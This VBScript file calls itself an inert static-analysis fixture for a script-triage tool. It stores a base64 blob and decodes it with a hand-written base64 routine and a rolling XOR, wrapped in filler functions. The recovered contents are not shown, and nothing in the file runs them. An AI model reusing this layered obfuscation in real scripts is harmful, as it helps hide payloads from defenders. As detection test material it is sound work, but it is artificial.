Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_bd267254 = "/sPyjv2J7Jzv0rPQodS9z6r1h+KP4JTx3arYscWg/5nwnPnVsdir27rOrcWa6pj3lPGC8d211Lresdex7p3+jOWV4Z38mPmJ/Zjq15rzkOKN/pH3g631uPS86LzskOOX9pH0q8in0rzI9cG93r/SosOqzaP8lfHMr86j07LbvNL/nvvLrZSmlayaqtaj0b2A6JzomOvR/tGw1eWDuoi7grSEqs+31rvLp8Lsheud/JD5nbKG59az0ejf5siszbnFsMOm1IvqjeiG8s+H8pzomv+M/7PSsJ/+m6vN9Mb1zPrKttC51bDvn/6K4t+cpvqv3LnLuOS0waPPpsWZ0aTKvsyp2qnlhOa6yb3cu97zkvfHoZiqmaCWpojsjfmF95L1nO+b6ZDPv96qwv+3/L/qtuWK7JjvjvyZxY34luKQ9Yb1udi65qLLuMin1LXXu96C44a20Onb6NHn16vFoNis84D0lfKXqti9zqHUpsWgjf6f8oLui6XVppc="
Const Codec_bd267254 = "base64_literal|rolling_xor|88"

Function Base64_bd267254(ByVal encodedText)
  Dim alphabet, cleanText, characterIndex, encodedCharacter, characterValue
  Dim outputBytes(), outputIndex, accumulator, bitCount
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  cleanText = Replace(Replace(encodedText, vbCr, ""), vbLf, "")
  ReDim outputBytes((Len(cleanText) * 3) \ 4)
  outputIndex = 0
  accumulator = 0
  bitCount = 0
  For characterIndex = 1 To Len(cleanText)
    encodedCharacter = Mid(cleanText, characterIndex, 1)
    If encodedCharacter <> "=" Then
      characterValue = InStr(1, alphabet, encodedCharacter, vbBinaryCompare) - 1
      If characterValue < 0 Then Err.Raise 5, "Base64_bd267254", "Invalid Base64 character"
      accumulator = (accumulator * 64) + characterValue
      bitCount = bitCount + 6
    End If
    If bitCount >= 8 Then
      bitCount = bitCount - 8
      outputBytes(outputIndex) = (accumulator \ (2 ^ bitCount)) And 255
      outputIndex = outputIndex + 1
      If bitCount = 0 Then
        accumulator = 0
      Else
        accumulator = accumulator And ((2 ^ bitCount) - 1)
      End If
    End If
  Next
  ReDim Preserve outputBytes(outputIndex - 1)
  Base64_bd267254 = outputBytes
End Function

Function Load_bd267254()
  Load_bd267254 = Base64_bd267254(Material_bd267254)
End Function

Function Decode_bd267254(ByRef storedMaterial)
  Dim result(), materialIndex, keyBytes, previous
  ReDim result(UBound(storedMaterial))
  previous = 136
  For materialIndex = 0 To UBound(storedMaterial)
    result(materialIndex) = storedMaterial(materialIndex) Xor previous
    previous = storedMaterial(materialIndex)
  Next
  Decode_bd267254 = result
End Function

Function Recover_bd267254()
  Dim storedMaterial, recoveredMaterial, configurationText, harmlessValue, materialIndex, decodePass, savedError, savedDescription
  If True Then
    harmlessValue = LCase(UCase("Host"))
      storedMaterial = Load_bd267254()
      Do
        recoveredMaterial = Decode_bd267254(storedMaterial)
        Exit Do
      Loop
      configurationText = ""
      For materialIndex = 0 To UBound(recoveredMaterial)
        configurationText = configurationText & Chr(recoveredMaterial(materialIndex))
      Next
  End If
  Recover_bd267254 = configurationText
End Function

Sub Copy_bd267254(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_bd267254()
  Dim resultText
  Call Copy_bd267254(Recover_bd267254(), resultText)
  Inspect_bd267254 = resultText
End Function
